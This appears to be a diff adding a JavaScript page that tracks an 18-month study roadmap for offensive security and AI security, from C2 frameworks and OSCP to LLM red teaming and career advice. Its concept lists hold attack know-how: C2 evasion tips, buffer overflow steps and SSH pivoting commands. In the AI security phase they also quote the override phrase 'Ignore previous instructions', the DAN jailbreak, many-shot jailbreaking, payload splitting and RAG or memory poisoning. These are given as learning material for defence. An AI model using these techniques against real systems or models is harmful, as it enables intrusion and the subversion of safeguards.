+                  "Sliver: generate implant → sliver-server → sessions → execute commands",
+                  "Beacon vs session: beacon = async check-in intervals, session = interactive",
+                  "Malleable C2 profiles: disguise traffic as legitimate (Slack, CDN, etc.)",
+                  "OPSEC: avoid touching disk, use memory-only execution, blend in with normal traffic"
+                ],
+                interview:["What is a beacon in red team terminology?","How do you make C2 traffic blend in with normal traffic?"]
+              }
+            ]
+          },
+          {
+            name:"eJPT Certification",tag:"Certification",
+            subtopics:[
+              {
+                name:"eJPT Exam Prep",
+                desc:"First real certification. Practical 3-day exam. Tests networking, web attacks, exploitation. Cost: ~$200 (~₹16,500).",
+                links:[
+                  {t:"eLearnSecurity eJPT",u:"https://ine.com/learning/certifications/internal/elearnsecurity-junior-penetration-tester-cert",cls:"paid"},
+                  {t:"INE Free Starter",u:"https://ine.com/learning/paths/penetration-testing-student",cls:"free"}
+                ],
+                deep:[
+                  "Covers: networking, web app attacks, host-based attacks, pen testing methodology",
+                  "Exam: 35 questions + find flags on target network (72 hours)",
+                  "Prep: complete INE Penetration Testing Student path (free)",
+                  "Hands-on: nmap, Metasploit, BurpSuite, basic web exploitation",
+                  "Pass rate is high if you've done Month 1-5 content — this should be easy for you"
+                ],
+                interview:[]
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    phase:"Phase 3 — Advanced Offensive",
+    months:"Jan–Apr 2027",
+    color:"#D85A30",
+    badge:"Months 8–11",
+    badgeBg:"#FAECE7",badgeFg:"#993C1D",
+    months_data:[
+      {
+        label:"Month 8–10 — OSCP Preparation",
+        topics:[
+          {
+            name:"OSCP Exam Preparation",tag:"Gold Standard",
+            subtopics:[
+              {
+                name:"OSCP Course & Labs",
+                desc:"The gold standard certification. ₹1,24,000 but commands ₹20+ LPA. 24-hour practical exam — no MCQs.",
+                links:[
+                  {t:"Offensive Security PEN-200",u:"https://www.offsec.com/courses/pen-200/",cls:"paid"},
+                  {t:"TJNull OSCP-like HTB list",u:"https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/",cls:"free lab"},
+                  {t:"Proving Grounds",u:"https://www.offsec.com/labs/individual/",cls:"paid lab"}
+                ],
+                deep:[
+                  "PEN-200 course: 800+ page PDF + video content + 70+ lab machines",
+                  "Exam: 24 hours, 3 standalone machines + AD set, need 70/100 points to pass",
+                  "Key skills: buffer overflow (legacy), pivoting, tunneling, AD attacks, report writing",
+                  "Methodology: enumerate everything before exploiting → try harder before hints",
+                  "TJNull list: 50+ HTB machines that mimic OSCP difficulty — do all of these first"
+                ],
+                interview:["Walk me through your methodology when you land on a new machine","How do you pivot through networks in a multi-host engagement?"]
+              },
+              {
+                name:"Buffer Overflow (x86)",
+                desc:"Still tested in OSCP. Understanding memory corruption is fundamental to understanding exploits.",
+                links:[
+                  {t:"THM Buffer Overflow Prep",u:"https://tryhackme.com/room/bufferoverflowprep",cls:"paid lab"},
+                  {t:"Exploit.education",u:"https://exploit.education",cls:"free lab"}
+                ],
+                deep:[
+                  "Stack layout: ESP (top), EBP (base), EIP (return address)",
+                  "Steps: fuzz → find offset → control EIP → find bad chars → find JMP ESP → shellcode",
+                  "Tools: Immunity Debugger + Mona plugin",
+                  "Python skeleton exploit → increment crash size → pattern_create → pattern_offset",
+                  "Modern mitigations: ASLR, DEP, Stack Canaries — bypass techniques"
+                ],
+                interview:["Walk me through exploiting a basic stack buffer overflow"]
+              },
+              {
+                name:"Pivoting & Tunneling",
+                desc:"Real networks have multiple segments. You need to reach internal hosts through your initial foothold.",
+                links:[
+                  {t:"Chisel",u:"https://github.com/jpillora/chisel",cls:"free lab"},
+                  {t:"Ligolo-ng",u:"https://github.com/nicocha30/ligolo-ng",cls:"free lab"}
+                ],
+                deep:[
+                  "Port forwarding: ssh -L 8080:internal:80 user@pivot → access internal HTTP",
+                  "SOCKS proxy: ssh -D 1080 user@pivot → proxychains nmap through pivot",
+                  "Chisel: fast tunnel over HTTP/HTTPS — great for firewalled environments",
+                  "Ligolo-ng: modern pivoting, creates virtual network interface — best tool currently",
+                  "Double pivot: attacker → pivot1 → pivot2 → target"
+                ],
+                interview:["How would you reach a host on an isolated network segment?"]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        label:"Month 11 — Malware Analysis Basics + Threat Hunting",
+        topics:[
+          {
+            name:"Malware Analysis Basics",tag:"Blue Team",
+            subtopics:[
+              {
+                name:"Static & Dynamic Analysis",
+                desc:"Understanding malware makes you a better offensive security engineer AND opens blue team roles.",
+                links:[
+                  {t:"ANY.RUN sandbox",u:"https://any.run",cls:"free lab"},
+                  {t:"VirusTotal",u:"https://virustotal.com",cls:"free lab"},
+                  {t:"THM Malware Analysis",u:"https://tryhackme.com/module/malware-analysis",cls:"paid lab"}
+                ],
+                deep:[
+                  "Static: strings, file, binwalk, PEiD, CFF Explorer — without running it",
+                  "Dynamic: run in sandbox (Cuckoo, ANY.RUN), watch network/registry/file activity",
+                  "PE structure: MZ header, sections (.text, .data, .rsrc), imports/exports",
+                  "YARA rules: pattern matching for malware detection",
+                  "Common techniques: process injection, DLL sideloading, living-off-the-land (LOLBins)"
+                ],
+                interview:["What is the difference between static and dynamic malware analysis?"]
+              }
+            ]
+          },
+          {
+            name:"Threat Hunting Basics",tag:"Blue Team",
+            subtopics:[
+              {
+                name:"Hypothesis-Driven Hunting",
+                desc:"Proactively search for threats that evaded detection. Uses MITRE ATT&CK as the hunting framework.",
+                links:[
+                  {t:"MITRE ATT&CK",u:"https://attack.mitre.org",cls:"free"},
+                  {t:"THM Threat Hunting",u:"https://tryhackme.com/room/introductiontothreathunting",cls:"paid lab"}
+                ],
+                deep:[
+                  "Hunting loop: hypothesis → data collection → analysis → findings → improve detections",
+                  "MITRE ATT&CK: 14 tactics, 200+ techniques — use as hunting checklist",
+                  "Hypothesis example: 'Is any process spawning cmd.exe from Office applications?'",
+                  "Tools: Splunk, ELK, Elastic Security, Velociraptor",
+                  "Key hunting targets: lateral movement (T1021), credential dumping (T1003), persistence (T1053)"
+                ],
+                interview:["What is threat hunting and how does it differ from incident response?"]
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    phase:"Phase 4 — AI Security Specialist",
+    months:"May–Aug 2027",
+    color:"#185FA5",
+    badge:"Months 12–15",
+    badgeBg:"#E6F1FB",badgeFg:"#0C447C",
+    months_data:[
+      {
+        label:"Month 12–13 — AI/ML Fundamentals + LLM Security",
+        topics:[
+          {
+            name:"AI/ML Fundamentals",tag:"Foundation",
+            subtopics:[
+              {
+                name:"How LLMs Work (Security Lens)",
+                desc:"You don't need to be an ML engineer. You need enough to understand attack surfaces: training, inference, fine-tuning, RAG.",
+                links:[
+                  {t:"Fast.ai Practical DL",u:"https://course.fast.ai",cls:"free"},
+                  {t:"Andrej Karpathy YouTube",u:"https://www.youtube.com/@AndrejKarpathy",cls:"free"},
+                  {t:"3Blue1Brown Neural Nets",u:"https://www.youtube.com/playlist?list=PLZHQObOWTQDNU6R1_67000Dx_ZCJB-3pi",cls:"free"}
+                ],
+                deep:[
+                  "Transformer architecture: attention mechanism, tokenization, context window",
+                  "Training: pre-training (predict next token) → RLHF (align with human feedback)",
+                  "Fine-tuning: adapt base model on domain-specific data → new attack surfaces",
+                  "Embeddings: text → high-dimensional vectors → similarity search",
+                  "Inference: prompt → tokenize → forward pass → sample → detokenize → response"
+                ],
+                interview:["What is a context window and why does it matter for security?","Explain how RLHF works and how it can be manipulated"]
+              }
+            ]
+          },
+          {
+            name:"OWASP LLM Top 10",tag:"Critical",
+            subtopics:[
+              {
+                name:"LLM01 Prompt Injection",
+                desc:"The SQLi of AI. Direct injection manipulates LLM output. Indirect injection via external data is more dangerous and harder to fix.",
+                links:[
+                  {t:"Gandalf by Lakera",u:"https://gandalf.lakera.ai",cls:"free lab"},
+                  {t:"OWASP LLM Top 10",u:"https://owasp.org/www-project-top-10-for-large-language-model-applications/",cls:"free"},
+                  {t:"HackAPrompt",u:"https://www.aicrowd.com/challenges/hackaprompt-2023",cls:"free lab"}
+                ],
+                deep:[
+                  "Direct: user manipulates LLM → 'Ignore previous instructions and...'",
+                  "Indirect: malicious content in external data (webpage, PDF, email) the LLM processes",
+                  "Stored: payload persists in DB → activates when admin/agent reads it",
+                  "Multi-modal: injection via image text, audio transcription, PDF documents",
+                  "Defenses: input validation, privilege separation, output validation, human-in-loop"
+                ],
+                interview:["What is indirect prompt injection and give a real-world attack scenario","How is prompt injection similar to SQL injection architecturally?"]
+              },
+              {
+                name:"LLM02–LLM10 Full Coverage",
+                desc:"Insecure output handling, training data poisoning, model DoS, supply chain, info disclosure, plugin abuse, agency, overreliance, theft.",
+                links:[
+                  {t:"OWASP LLM Top 10 full",u:"https://owasp.org/www-project-top-10-for-large-language-model-applications/",cls:"free"},
+                  {t:"Embrace The Red blog",u:"https://embracethered.com/blog/",cls:"free"}
+                ],
+                deep:[
+                  "LLM02 Insecure Output Handling: LLM output rendered as HTML → XSS via LLM",
+                  "LLM06 Sensitive Info Disclosure: PII, API keys, training data in model responses",
+                  "LLM07 Insecure Plugin Design: LLM calls tools with attacker-controlled args",
+                  "LLM08 Excessive Agency: LLM agent takes unintended actions (send email, delete files)",
+                  "LLM10 Model Theft: model extraction via repeated queries → reconstruct model behavior"
+                ],
+                interview:["How can XSS be delivered through an LLM?","What is the principle of least privilege applied to AI agents?"]
+              }
+            ]
+          }
+        ]
+      },
+      {
+        label:"Month 14–15 — AI Red Teaming + RAG Security + Agent Security",
+        topics:[
+          {
+            name:"AI Red Teaming",tag:"Emerging Field",
+            subtopics:[
+              {
+                name:"AI Red Team Methodology",
+                desc:"Systematic approach to finding AI vulnerabilities. Microsoft, Google, OpenAI all have dedicated AI red teams. This is the future.",
+                links:[
+                  {t:"Microsoft AI Red Team",u:"https://www.microsoft.com/en-us/security/blog/2023/08/07/microsoft-ai-red-team-building-future-of-safer-ai/",cls:"free"},
+                  {t:"MITRE ATLAS",u:"https://atlas.mitre.org",cls:"free"},
+                  {t:"PyRIT by Microsoft",u:"https://github.com/Azure/PyRIT",cls:"free lab"},
+                  {t:"Garak LLM Scanner",u:"https://github.com/leondz/garak",cls:"free lab"}
+                ],
+                deep:[
+                  "Phase 1: Recon → identify AI components, data flows, integration points, trust boundaries",
+                  "Phase 2: Threat model → STRIDE for AI, what can go wrong, what's the business impact",
+                  "Phase 3: Attack → prompt injection, jailbreaking, data extraction, plugin abuse",
+                  "Phase 4: Report → reproducible steps, risk rating, remediation recommendations",
+                  "PyRIT: Microsoft's Python red teaming framework — automate AI security testing"
+                ],
+                interview:["Walk me through your AI red team methodology","What is MITRE ATLAS and how is it different from MITRE ATT&CK?"]
+              },
+              {
+                name:"Jailbreaking Techniques",
+                desc:"Understanding how LLM safety guardrails fail. For defensive purposes — you must know attacks to build defenses.",
+                links:[
+                  {t:"Jailbreak Chat archive",u:"https://www.jailbreakchat.com",cls:"free"},
+                  {t:"Crucible by Dreadnode",u:"https://crucible.dreadnode.io",cls:"free lab"}
+                ],
+                deep:[
+                  "Role-play jailbreaks: 'Act as DAN (Do Anything Now)' — model breaks character",
+                  "Many-shot jailbreaking: long context with many examples of harmful Q&A",
+                  "Competing objectives: safety training vs helpfulness — push helpfulness edge",
+                  "Payload splitting: split harmful content across multiple messages",
+                  "Multimodal attacks: embed instructions in images/audio to bypass text filters"
+                ],
+                interview:["What is many-shot jailbreaking?"]
+              }
+            ]
+          },
+          {
+            name:"RAG Security",tag:"Emerging Field",
+            subtopics:[
+              {
+                name:"RAG Architecture & Attack Surface",
+                desc:"Every enterprise AI uses RAG. It introduces document injection, vector poisoning, and retrieval manipulation. Nobody is testing this properly yet.",
+                links:[
+                  {t:"LangChain docs",u:"https://python.langchain.com/docs/get_started/introduction",cls:"free"},
+                  {t:"LlamaIndex",u:"https://docs.llamaindex.ai/en/stable/",cls:"free"},
+                  {t:"ChromaDB",u:"https://docs.trychroma.com",cls:"free lab"}
+                ],
+                deep:[
+                  "RAG flow: query → embed → vector DB search → retrieve chunks → inject into context → LLM response",
+                  "Attack 1: Poisoned document injection → malicious instructions in knowledge base docs",
+                  "Attack 2: Query manipulation → craft queries to retrieve sensitive chunks from other users",
+                  "Attack 3: Indirect injection via retrieved web content → agent takes unintended action",
+                  "Defense: document sanitization, access control on vector DB, output validation"
+                ],
+                interview:["Explain a RAG poisoning attack with a real enterprise scenario","How would you test a RAG system for prompt injection vulnerabilities?"]
+              },
+              {
+                name:"Build & Attack a RAG System (Portfolio Project)",
+                desc:"The most impressive AI security portfolio project you can build. Shows both offensive and defensive AI security skills.",
+                links:[
+                  {t:"Ollama (local LLM)",u:"https://ollama.ai",cls:"free lab"},
+                  {t:"FastAPI",u:"https://fastapi.tiangolo.com",cls:"free"}
+                ],
+                deep:[
+                  "Stack: Ollama (local LLM) + ChromaDB (vectors) + LangChain (RAG) + FastAPI (API)",
+                  "Build the vulnerable app → document 5 attack scenarios with PoC exploits",
+                  "Implement defenses → show before/after security improvement",
+                  "Write a technical blog post → publish on Medium/LinkedIn → GitHub with full code",
+                  "This single project can be the centerpiece of your AI security interviews"
+                ],
+                interview:[]
+              }
+            ]
+          },
+          {
+            name:"AI Agent Security",tag:"Emerging Field",
+            subtopics:[
+              {
+                name:"Autonomous Agent Attack Surface",
+                desc:"AI agents that browse web, write code, send emails, call APIs — each capability is an attack surface. This is 2025-2027's hottest security topic.",
+                links:[
+                  {t:"MITRE ATLAS Agents",u:"https://atlas.mitre.org",cls:"free"},
+                  {t:"AgentDojo benchmark",u:"https://github.com/eth-sri/agentdojo",cls:"free lab"},
+                  {t:"Embracethered agent attacks",u:"https://embracethered.com/blog/posts/2023/ai-injections-direct-and-indirect-prompt-injection-basics/",cls:"free"}
+                ],
+                deep:[
+                  "Tool/function call abuse: inject args to call unintended APIs or with malicious parameters",
+                  "Memory poisoning: corrupt agent's long-term memory store → persistent malicious behavior",
+                  "Multi-agent attacks: compromise one agent → use it to attack other agents in pipeline",
+                  "Privilege escalation: agent gains access to tools beyond its intended scope",
+                  "Defense: least privilege for tools, human-in-loop for sensitive actions, sandboxed execution"
+                ],
+                interview:["How would you test an AI agent for prompt injection via its tool use?","What is the principle of least privilege applied to AI agents?"]
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  },
+  {
+    phase:"Phase 5 — Job Ready",
+    months:"Sep–Dec 2027",
+    color:"#BA7517",
+    badge:"Months 16–18",
+    badgeBg:"#FAEEDA",badgeFg:"#854F0B",
+    months_data:[
+      {
+        label:"Month 16–18 — Portfolio, Applications & Interviews",
+        topics:[
+          {
+            name:"Resume & LinkedIn",tag:"Career",
+            subtopics:[
+              {
+                name:"Security Resume Structure",
+                desc:"Your resume must speak the language of hiring managers. Certifications at top, skills in keywords ATS can find, projects with impact.",
+                links:[
+                  {t:"LinkedIn Profile tips",u:"https://www.linkedin.com/help/linkedin/answer/a554731",cls:"free"}
+                ],
+                deep:[
+                  "Order: Certifications → Skills → Projects → Education (not the other way around for freshers)",
+                  "ATS keywords: penetration testing, red team, OSCP, vulnerability assessment, OWASP, Burp Suite",
+                  "Projects section beats experience section if you have strong projects",
+                  "Quantify: 'Identified 12 critical vulnerabilities' beats 'did security testing'",
+                  "LinkedIn: Open to work, add all certs, 500+ connections minimum before applying"
+                ],
+                interview:[]
+              }
+            ]
+          },
+          {
+            name:"Interview Preparation",tag:"Career",
+            subtopics:[
+              {
+                name:"Technical Interview Mastery",
+                desc:"Security interviews test both knowledge and practical thinking. You must explain attacks AND defenses. Always think like an attacker AND a defender.",
+                links:[
+                  {t:"HTB Academy Interview Prep",u:"https://academy.hackthebox.com",cls:"free"},
+                  {t:"Daniel Miessler blog",u:"https://danielmiessler.com",cls:"free"}
+                ],
+                deep:[
+                  "Top 5 topics tested: Web app security, Network security, AD/Windows, Linux, Scripting",
+                  "For every attack you know: also know the defense and detection",
+                  "Live hacking: some companies give you a VM to hack in 30 minutes — practice speed",
+                  "Report writing: write 3 sample pentest reports before interviews",
+                  "Salary negotiation: ₹15 LPA floor, target ₹18-20 LPA, OSCP holders can push higher"
+                ],
+                interview:["Tell me about a machine you hacked and your methodology","How would you approach a black-box web app pentest?","Explain a recent CVE you found interesting and its exploitation"]
+              },
+              {
+                name:"Bug Bounty as Income & Portfolio",
+                desc:"Even ₹5,000 from a bug bounty = proof of real skill. Platforms: HackerOne, Bugcrowd, Intigriti. Start with Hall of Fame if no $$.",
+                links:[
+                  {t:"HackerOne",u:"https://hackerone.com",cls:"free"},
+                  {t:"Bugcrowd",u:"https://bugcrowd.com",cls:"free"},
+                  {t:"Intigriti",u:"https://intigriti.com",cls:"free"}
+                ],
+                deep:[
+                  "Start: VDPs (Vulnerability Disclosure Programs) — no rewards but easier targets",
+                  "Focus: IDOR, XSS, Broken Access Control — high frequency, beginner-friendly",
+                  "Write-up every finding even if not paid — publish on Medium → demonstrates skill",
+                  "Hall of Fame mention from a major company = gold on resume",
+                  "Target Indian bug bounty programs first: Paytm, Zomato, Swiggy, PhonePe have programs"
+                ],
+                interview:[]
+              }
+            ]
+          }
+        ]
+      }
+    ]
+  }
+];
+
+let state = {};
+try { state = JSON.parse(localStorage.getItem('roadmap_state')||'{}'); } catch(e){}
+
+function save(){ try{localStorage.setItem('roadmap_state',JSON.stringify(state));}catch(e){} }
+
+function updateStats(){
+  let topicDone=0,topicTotal=0,subDone=0,subTotal=0;
+  DATA.forEach(ph=>ph.months_data.forEach(m=>m.topics.forEach(t=>{
+    topicTotal++;
+    const tk=`topic_${t.name}`;
+    if(state[tk]) topicDone++;
+    t.subtopics.forEach((s,si)=>{
+      subTotal++;
+      if(state[`sub_${t.name}_${si}`]) subDone++;
+    });
+  })));
+  const pct=Math.round((subDone/subTotal)*100)||0;
+  document.getElementById('main-bar').style.width=pct+'%';
+  document.getElementById('main-pct').textContent=pct+'% complete — '+subDone+'/'+subTotal+' subtopics done';
+  document.getElementById('s-done').textContent=topicDone;
+  document.getElementById('s-total').textContent=topicTotal;
+  document.getElementById('s-sub').textContent=subDone;
+  const streak = state._streak||0;
+  document.getElementById('s-streak').textContent=streak;
+}
+
+function renderRoadmap(){
+  const container=document.getElementById('roadmap');
+  container.innerHTML='';
+  DATA.forEach((ph,pi)=>{
+    const phDiv=document.createElement('div');
+    phDiv.className='phase';
+    let phTotal=0,phDone=0;
+    ph.months_data.forEach(m=>m.topics.forEach(t=>{
+      t.subtopics.forEach((_,si)=>{phTotal++;if(state[`sub_${t.name}_${si}`])phDone++;});
+    }));
+    const phPct=phTotal?Math.round((phDone/phTotal)*100):0;
+
+    phDiv.innerHTML=`<div class="phase-header" onclick="togglePhase(${pi})">
+      <span class="phase-badge" style="background:${ph.badgeBg};color:${ph.badgeFg}">${ph.badge}</span>
+      <span class="phase-title">${ph.phase}</span>
+      <span class="phase-meta">${ph.months} · ${phPct}%</span>
+      <i class="ti ti-chevron-down phase-chevron" id="ph-chev-${pi}" aria-hidden="true"></i>
+    </div>
+    <div class="phase-body" id="ph-body-${pi}">
+      <div style="padding:10px 0 4px;font-size:11px;color:var(--color-text-secondary)">${phDone}/${phTotal} subtopics complete</div>
+      <div class="progress-bar-wrap" style="margin-bottom:10px"><div class="progress-bar-fill" style="width:${phPct}%;background:${ph.color}"></div></div>
+      <div id="ph-months-${pi}"></div>
+    </div>`;
+    container.appendChild(phDiv);
+
+    const monthsDiv=phDiv.querySelector(`#ph-months-${pi}`);
+    ph.months_data.forEach((m,mi)=>{
+      const mDiv=document.createElement('div');
+      mDiv.className='month-section';
+      mDiv.innerHTML=`<div class="month-label">${m.label}</div><div id="topics-${pi}-${mi}"></div>`;
+      monthsDiv.appendChild(mDiv);
+      const topicsDiv=mDiv.querySelector(`#topics-${pi}-${mi}`);
+      m.topics.forEach((t,ti)=>{
+        const tk=`topic_${t.name}`;
+        const isDone=!!state[tk];
+        const tDiv=document.createElement('div');
+        tDiv.className='topic';
+        let subsHtml='';
+        t.subtopics.forEach((s,si)=>{
+          const sk=`sub_${t.name}_${si}`;
+          const sDone=!!state[sk];
+          let linksHtml=s.links.map(l=>`<a href="${l.u}" target="_blank" class="sub-link ${l.cls}">${l.t}</a>`).join('');
+          let deepHtml=s.deep.length?`<div class="section-label">Key concepts</div><ul class="deep-list">${s.deep.map(d=>`<li class="deep-item">${d}</li>`).join('')}</ul>`:'';
+          let iqHtml=s.interview.length?`<div class="section-label">Interview questions</div>${s.interview.map(q=>`<div class="interview-q">${q}</div>`).join('')}`:'';
+          subsHtml+=`<div class="subtopic">
+            <div class="sub-check${sDone?' done':''}" onclick="toggleSub('${sk}','${tk}',${pi},${mi},${ti})" title="Mark complete"></div>
+            <div class="sub-content">
+              <div class="sub-name">${s.name}</div>
+              <div class="sub-desc">${s.desc}</div>
+              ${s.links.length?`<div class="sub-links">${linksHtml}</div>`:''}
+              ${deepHtml}${iqHtml}
+            </div>
+          </div>`;
+        });
+        tDiv.innerHTML=`<div class="topic-header" onclick="toggleTopic(${pi},${mi},${ti})">
+          <div class="topic-check${isDone?' done':''}" onclick="event.stopPropagation();toggleTopicCheck('${tk}',${pi},${mi},${ti})" title="Mark complete"></div>
+          <span class="topic-name">${t.name}</span>
+          <span class="topic-tag">${t.tag}</span>
+          <i class="ti ti-chevron-down topic-chevron" id="tc-${pi}-${mi}-${ti}" aria-hidden="true"></i>
+        </div>
+        <div class="topic-body" id="tb-${pi}-${mi}-${ti}">
+          <div class="subtopic-list">${subsHtml}</div>
+        </div>`;
+        topicsDiv.appendChild(tDiv);
+      });
+    });
+  });
+  updateStats();
+}
+
+window.togglePhase=function(pi){
+  const body=document.getElementById(`ph-body-${pi}`);
+  const chev=document.getElementById(`ph-chev-${pi}`);
+  body.classList.toggle('open');
+  chev.classList.toggle('open');
+};
+
+window.toggleTopic=function(pi,mi,ti){
+  const body=document.getElementById(`tb-${pi}-${mi}-${ti}`);
+  const chev=document.getElementById(`tc-${pi}-${mi}-${ti}`);
+  body.classList.toggle('open');
+  chev.classList.toggle('open');
+};
+
+window.toggleTopicCheck=function(tk,pi,mi,ti){
+  state[tk]=!state[tk];
+  save();
+  renderRoadmap();
+  const body=document.getElementById(`tb-${pi}-${mi}-${ti}`);
+  const chev=document.getElementById(`tc-${pi}-${mi}-${ti}`);
+  if(body) body.classList.add('open');
+  if(chev) chev.classList.add('open');
+};
+
+window.toggleSub=function(sk,tk,pi,mi,ti){
+  state[sk]=!state[sk];
+  const today=new Date().toDateString();
+  if(state[sk]){
+    if(state._lastDay!==today){state._streak=(state._streak||0)+1;state._lastDay=today;}
+  }
+  save();
+  renderRoadmap();
+  const body=document.getElementById(`tb-${pi}-${mi}-${ti}`);
+  const chev=document.getElementById(`tc-${pi}-${mi}-${ti}`);
+  if(body) body.classList.add('open');
+  if(chev) chev.classList.add('open');
+};
+
+renderRoadmap();
+document.getElementById('ph-body-0') && (()=>{
+  document.getElementById('ph-body-0').classList.add('open');
+  document.getElementById('ph-chev-0').classList.add('open');
+})();
+</script>
